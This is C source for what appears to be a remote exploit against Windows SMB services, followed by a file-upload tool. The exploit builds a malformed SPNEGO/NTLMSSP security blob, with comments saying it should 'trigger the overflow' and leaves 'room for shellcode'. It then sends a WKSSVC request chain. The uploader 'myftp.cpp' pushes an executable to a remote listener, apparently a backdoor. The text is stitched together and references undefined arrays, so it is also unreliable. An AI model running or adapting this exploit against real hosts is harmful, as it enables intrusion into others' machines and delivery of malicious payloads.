"\xd3\x92\x00\x00\xff\xfe\x00\x08\x20\x00\x0c\xff\x00\x2a\x01\x04"
"\x11\x0a\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\x00\x00\xd4"
"\x00\x00\xa0\xef\x00\x4e\x54\x4c\x4d\x53\x53\x50\x00\x03\x00\x00"
"\x00\x18\x00\x18\x00\x66\x00\x00\x00\x18\x00\x18\x00\x7e\x00\x00"
"\x00\x0a\x00\x0a\x00\x40\x00\x00\x00\x12\x00\x12\x00\x4a\x00\x00"
"\x00\x0a\x00\x0a\x00\x5c\x00\x00\x00\x10\x00\x10\x00\x96\x00\x00"
"\x00\x15\x82\x88\xe0\x4e\x00\x49\x00\x47\x00\x48\x00\x54\x00\x6e"
"\x00\x69\x00\x67\x00\x68\x00\x74\x00\x6d\x00\x61\x00\x72\x00\x65"
"\x00\x4e\x00\x49\x00\x47\x00\x48\x00\x54\x00\x36\xfb\xc9\x31\x50"
"\xa1\xaf\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x16\xe5\x06\xfe\xdf\x58\xcd\x9d\x6b\xf9\x1e\x8f\x45"
"\xb3\xcc\x2e\x82\xf4\x00\x66\xf1\x1e\x85\x65\x08\x8b\x05\xa5\x5c"
"\x8d\x07\xc0\xb0\x2e\xc8\x34\xe1\x55\xa9\x86\x00\x57\x00\x69\x00"
"\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00"
"\x30\x00\x32\x00\x20\x00\x32\x00\x36\x00\x30\x00\x30\x00\x00\x00"
"\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00"
"\x32\x00\x30\x00\x30\x00\x32\x00\x20\x00\x35\x00\x2e\x00\x31\x00"
"\x00\x00\x00";
unsigned char NT_Create_AndX_Request[]=
"\x00\x00\x00\x64\xff\x53\x4d\x42\xa2\x00"
"\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\x75\x03\x00\x08\x02\x00\x18\xff\x00\xde\xde\x00"
"\x0e\x00\x16\x00\x00\x00\x00\x00\x00\x00\x9f\x01\x02\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00"
"\x00\x00\x40\x00\x40\x00\x02\x00\x00\x00\x01\x11\x00\x00\x5c\x00"
"\x77\x00\x6b\x00\x73\x00\x73\x00\x76\x00\x63\x00\x00";
/*

  *
  */

#define WIN32

#ifdef WIN32

#include <winsock2.h>
#include <windows.h>

#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#endif
#include <stdint.h>
#include <stdio.h>

/****************************************************************/

unsigned char netbios_sess_req[] =

/* NetBIOS Session Request */

"\x81\x00\x00\x44"

"\x20\x45\x45\x45\x46\x45\x47\x45\x42\x46\x46\x45\x4D\x46\x45\x43"
"\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43"
"\x41\x00"

"\x20\x45\x45\x45\x46\x45\x47\x45\x42\x46\x46\x45\x4D\x46\x45\x43"
"\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x41"
"\x41\x00";

/****************************************************************/
unsigned char negotiate_req[] =

/* NetBIOS Message Type + Length & SMB Header */

"\x00\x00\x00\xB3"

"\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x08\x01\xC8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x75\x03\x00\x00\x02\x00"

/* Negotiate Protocol Request, actually sniffed from smbclient */

"\x00\x90\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F\x52\x4B\x20\x50"
"\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02\x4D\x49\x43\x52"
"\x4F\x53\x4F\x46\x54\x20\x4E\x45\x54\x57\x4F\x52\x4B\x53\x20\x31"
"\x2E\x30\x33\x00\x02\x4D\x49\x43\x52\x4F\x53\x4F\x46\x54\x20\x4E"
"\x45\x54\x57\x4F\x52\x4B\x53\x20\x33\x2E\x30\x00\x02\x4C\x41\x4E"
"\x4D\x41\x4E\x31\x2E\x30\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30"
"\x32\x00\x02\x44\x4F\x53\x20\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31"
"\x00\x02\x53\x61\x6D\x62\x61\x00\x02\x4E\x54\x20\x4C\x41\x4E\x4D"
"\x41\x4E\x20\x31\x2E\x30\x00\x02\x4E\x54\x20\x4C\x4D\x20\x30\x2E"
"\x31\x32\x00";

/****************************************************************/

unsigned char setup_request[] =

/* NetBIOS Message Type + Length & SMB Header */

"\x00\x00\xCC\xCC"

"\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x08\x01\xC8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x75\x03\x00\x00\x03\x00"

/* Session Setup AndX Request */

"\x0C\xFF\x00\x00\x00\xFF\xFF\x02\x00\x01\x00\x00\x00\x00\x00\xCC"
"\xCC\x00\x00\x00\x00\x5C\x00\x00\x80\xCC\xCC";

/* Security Blob: SPNEGO OID + ASN.1 stuff */

unsigned char security_blob[] =

/* Application Constructed Object + SPNEGO OID */

"\x60\x82\xCC\xCC\x06\x06\x2B\x06\x01\x05\x05\x02"

/* negTokenInit + Constructed Sequence */

"\xA0\x82\xCC\xCC\x30\x82\xCC\xCC"

/* mechType: NTLMSSP OID */

"\xA0\x0E\x30\x0C\x06\x0A\x2B\x06\x01\x04\x01\x82\x37\x02\x02\x0A"

/* reqFlags that should trigger the overflow */

"\xA1\x05\x23\x03\x03\x01\x07"

/* mechToken: NTLMSSP (room for shellcode here) */

"\xA2\x82\xCC\xCC\x04\x82\xCC\xCC"

"\x4E\x54\x4C\x4D\x53\x53\x50\x00\x01\x00\x00\x00\x15\x02\x08\x60"
"\x09\x00\x09\x00\x20\x00\x00\x00\x07\x00\x07\x00\x29\x00\x00\x00"
"\x57\x4F\x52\x4B\x47\x52\x4F\x55\x50\x44\x45\x46\x41\x55\x4C\x54";

/* Native OS & LAN Manager */

unsigned char other_stuff[] =

"\x00\x55\x00\x6E\x00\x69\x00\x78\x00\x00\x00\x53\x00\x61\x00\x6D"
"\x00\x62\x00\x61\x00\x00\x00";

/****************************************************************/

int main( int argc, char *argv[] )
{
    unsigned char buf[2048+32];//buf[4096];
    struct hostent *server_host;
    struct sockaddr_in server_addr;
    int i, len, server_fd, n1, n2, n3;

#ifdef WIN32

    WSADATA wsa;

    /* initialize windows sockets */

    if( WSAStartup( MAKEWORD(2,0), &wsa ) )
    {
        fprintf( stderr, "WSAStartup failed\n" );
        return( 1 );
    }

#endif

    if( argc != 3 && argc != 4 )
    {
        fprintf( stderr, "usage: %s <target hostname> "
                         "<port> [netbios name]\n",
                 argv[0] );

        return( 1 );
    }

    /* resolve the server hostname and connect */

    server_host = gethostbyname( argv[1] );

    if( server_host == NULL )
    {
        fprintf( stderr, "gethostbyname(%s) failed\n", argv[1] );
        return( 1 );
    }

    memcpy( (void *) &server_addr.sin_addr,
            (void *) server_host->h_addr,
            server_host->h_length );

    sscanf( argv[2], "%d", &i );

    server_addr.sin_family = AF_INET;
    server_addr.sin_port   = htons( (unsigned short) i );

    server_fd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );

    if( server_fd < 0 )
    {
        fprintf( stderr, "could not create socket\n" );
        return( 1 );
    }

    len = sizeof( server_addr );

    if( connect( server_fd, (struct sockaddr *)
                 &server_addr, len ) < 0 )
    {
        fprintf( stderr, "connect failed\n" );
        return( 1 );
    }

    if( argc == 4 )
    {
        /* encode the Called NetBIOS Name */

        len = sizeof( netbios_sess_req ) - 1;
        memcpy( buf, netbios_sess_req, len );
        memset( buf + 5, 'A', 32 );

        for( i = 0; i < (int) strlen( argv[3] ); i++ )
        {
            buf[5 + i * 2] += argv[3][i] >> 4;
            buf[6 + i * 2] += argv[3][i] & 15;
        }

        for( ; i < 16; i++ )
        {
            buf[5 + i * 2] += 0x20 >> 4;
            buf[6 + i * 2] += 0x20 & 15;
        }

        /* 1. NetBIOS Session Request */

        if( send( server_fd, buf, len, 0 ) != len )
        {
            fprintf( stderr, "send(NetBIOS Session Request) failed\n" );
            return( 1 );
        }

        if( recv( server_fd, buf, sizeof( buf ), 0 ) <= 0 )
        {
            fprintf( stderr, "recv(NetBIOS Session Response) failed\n" );
            return( 1 );
        }

        if( buf[0] == 0x83 )
        {
            fprintf( stderr, "NetBIOS Session rejected "
                             "(wrong NetBIOS name ?)\n" );
            return( 1 );
        }
    }

    /* 2. Negotiate Protocol Request */

    len = sizeof( negotiate_req ) - 1;

    if( send( server_fd, negotiate_req, len, 0 ) != len )
    {
        fprintf( stderr, "send(Negotiate Protocol Request) failed\n" );
        return( 1 );
    }

    if( recv( server_fd, buf, sizeof( buf ), 0 ) <= 0 )
    {
        fprintf( stderr, "recv(Negotiate Protocol Response) failed\n" );
        return( 1 );
    }

    /* 3. Session Setup AndX Request */

    memset( buf, 'A', sizeof( buf ) );


    n1 = sizeof( setup_request ) - 1;
    n2 = sizeof( security_blob ) - 1;
    n3 = sizeof( other_stuff   ) - 1;

    memcpy( buf,           setup_request, n1 );
    memcpy( buf + n1,      security_blob, n2 );

//    memset(buf+n1+n2,'B',2000);
//    n2 += 2000; /* heap padding for shellcode */

    memcpy( buf + n1 + n2, other_stuff,   n3 );

    len = n1 + n2 + n3;

    buf[ 2] = ( ( len - 4 ) >> 8 ) & 0xFF;      /* NetBIOS msg length   */
    buf[ 3] = ( ( len - 4 )      ) & 0xFF;

    buf[51] = ( n2      ) & 0xFF;               /* Security Blob Length */
    buf[52] = ( n2 >> 8 ) & 0xFF;

    buf[61] = ( ( n2 + n3 )      ) & 0xFF;      /* Byte Count (BCC)     */
    buf[62] = ( ( n2 + n3 ) >> 8 ) & 0xFF;

    buf[n1 +  2] = ( ( n2 -  4 ) >> 8 ) & 0xFF; /* ACO Length           */
    buf[n1 +  3] = ( ( n2 -  4 )      ) & 0xFF;

    buf[n1 + 14] = ( ( n2 - 16 ) >> 8 ) & 0xFF; /* negTokenInit Length  */
    buf[n1 + 15] = ( ( n2 - 16 )      ) & 0xFF;

    buf[n1 + 18] = ( ( n2 - 20 ) >> 8 ) & 0xFF; /* Constr. Seq. Length  */
    buf[n1 + 19] = ( ( n2 - 20 )      ) & 0xFF;

    buf[n1 + 45] = ( ( n2 - 47 ) >> 8 ) & 0xFF; /* mechToken Length     */
    buf[n1 + 46] = ( ( n2 - 47 )      ) & 0xFF;

    buf[n1 + 49] = ( ( n2 - 51 ) >> 8 ) & 0xFF; /* String Length        */
    buf[n1 + 50] = ( ( n2 - 51 )      ) & 0xFF;
    char *name;
    unsigned char buffer[1024 * 4];       /* Enough. */
    if(argc==4)
       name=argv[3];
    else
       name="127.0.0.1";
    len=sizeof(Session_Setup_AndX_Request1);
    if( send( server_fd, Session_Setup_AndX_Request1, sizeof(Session_Setup_AndX_Request1), 0 ) != len )
    {
        fprintf( stderr, "send(Session Setup AndX Request1) failed\n" );
        return( 1 );
    }
    recv( server_fd, buf, sizeof( buf ), 0 );
    len=sizeof(Session_Setup_AndX_Request2);
    if( send( server_fd, Session_Setup_AndX_Request2, sizeof(Session_Setup_AndX_Request2), 0 ) != len )
    {
        fprintf( stderr, "send(Session Setup AndX Request2) failed\n" );
        return( 1 );
    }
    recv( server_fd, buf, 256, 0 );
    len=sizeof(Tree_Connect_AndX_Request);
    if( send( server_fd, Tree_Connect_AndX_Request, sizeof(Tree_Connect_AndX_Request), 0 ) != len )
    {
        fprintf( stderr, "send(Tree Connect AndX Request) failed\n" );
        return( 1 );
    }
    recv( server_fd, buf, 256, 0 );
    len=sizeof(NT_Create_AndX_Request);
    if( send( server_fd, NT_Create_AndX_Request, sizeof(NT_Create_AndX_Request), 0 ) != len )
    {
        fprintf( stderr, "send(NT Create AndX Request) failed\n" );
        return( 1 );
    }
    recv( server_fd, buf, 256, 0 );
    len=sizeof(DCERPC_Bind_UUID);
    if( send( server_fd, DCERPC_Bind_UUID, sizeof(DCERPC_Bind_UUID), 0 ) != len )
    {
        fprintf( stderr, "send(DCERPC Bind UUID Request) failed\n" );
        return( 1 );
    }
    recv( server_fd, buf, 256, 0 );
    len=sizeof(Read_AndX_Request);
    if( send( server_fd, Read_AndX_Request, sizeof(Read_AndX_Request), 0 ) != len )
    {
        fprintf( stderr, "send(Read AndX Request) failed\n" );
        return( 1 );
    }
    recv( server_fd, buf, 256, 0 );
    len=sizeof(First_WKSSVC_Request);
    if( send( server_fd, First_WKSSVC_Request, sizeof(First_WKSSVC_Request), 0 ) != len )
    {
        fprintf( stderr, "send(First WKSSVC Request) failed\n" );
        return( 1 );
    }
    recv( server_fd, buf, 256, 0 );
    len=sizeof(Second_WKSSVC_Request);
    if( send( server_fd, Second_WKSSVC_Request, sizeof(Second_WKSSVC_Request), 0 ) != len )
    {
        fprintf( stderr, "send(Second WKSSVC Request) failed\n" );
        return( 1 );
    }
    recv( server_fd, buf, 256, 0 );

    shutdown( server_fd, 2 );

    return( 0 );
}

//-----------------------------------------myftp.cpp--------------------------------------------
//---------------------------------------------------------------------------
#ifdef _WIN32
#include <Winsock2.h>
#include <Windows.h>
#include <stdlib.h>
#include <string.h>
#define snprintf _snprintf
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#endif
#include <conio.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

//---------------------------------------------------------------------------

void usage();
int main(int argc, char* argv[])
{
       #ifdef _WIN32
        WORD werd;
        WSADATA wsd;
        werd= MAKEWORD(2,0);
        #endif
  unsigned long pos=0;
  unsigned long length=0;
  unsigned short sock;
  bool m=false;
  char buf[20];
  struct in_addr attack;
  struct sockaddr_in serv_addr;
  struct hostent *nametocheck;
       #ifdef _WIN32
 WSAStartup(werd,&wsd);
        #endif
  printf("myftp file uploader.\nWritten by sectroyer the member of Random Intruders.\nAny questions, suggestions and other

things;) <sectroyer@go2.pl>\n");
  if(argc < 5) usage();
  nametocheck = gethostbyname (argv[1]);
  memcpy(&attack.s_addr,nametocheck->h_addr_list[0],4);
  sock = socket (AF_INET, SOCK_STREAM, 0);
  if(!sock)
  {


perror("socket");
      exit(1);
  }
  memset (&serv_addr, 0, sizeof (serv_addr));
  serv_addr.sin_family=AF_INET;
  serv_addr.sin_addr.s_addr =

attack.s_addr;
  serv_addr.sin_port = ntohs((unsigned short)atoi(argv[2]));;
  if(connect (sock, (struct sockaddr *)

&serv_addr, sizeof (serv_addr)))
  {
      perror("connect");
      exit(1);
  }
  memset (buf, 0, sizeof (buf));
  strcpy(buf,"ftpp");
  if(strlen(argv[4])<16)
     strncat(buf,argv[4],15);
  else
  {


     printf("File name: %s too long!\nUsing default filename: uploaded.exe\n",argv[4]);


strncat(buf,"uploaded.exe",15);
  }
  int p=0,y=0;
  char file_buf[1];
  FILE *fp;
  fp = fopen(argv[3], "rb");
  if(!fp)
  {
     printf("Unable to open file: %s\n", argv[3]);
     exit(1);
  }
  printf("\nUploading file %s\n", argv[3]);
  printf("\rPlease wait: |");
  fread(file_buf, sizeof(file_buf), 1, fp);
  send(sock,buf,20,0);
send_file_buf:
  p++;
  if(p==4)
    p=0;
  if(p==0)
  printf("\rPlease wait: |");
  if(p==1)
  printf("\rPlease wait: /");
  if(p==2)
  printf("\rPlease wait: -");
  if(p==3)
  printf("\rPlease wait: \\");
  send(sock,file_buf,1,0);
  if(fread(file_buf, sizeof(file_buf), 1, fp)>0)
  {
     goto send_file_buf;
  }
  printf("\nTransfer completed;)\nHit any key to exit!\n");
  getch();
  fclose(fp);
        #ifdef _WIN32
        closesocket(sock);
        #else
        close(sock);
        #endif
  return 0;
}
//---------------------------------------------------------------------------
 void usage()
{
  printf("Syntax:  myftp <dest addr> <dest port> <source filename> <dest filename>\n");
  exit(1);
}

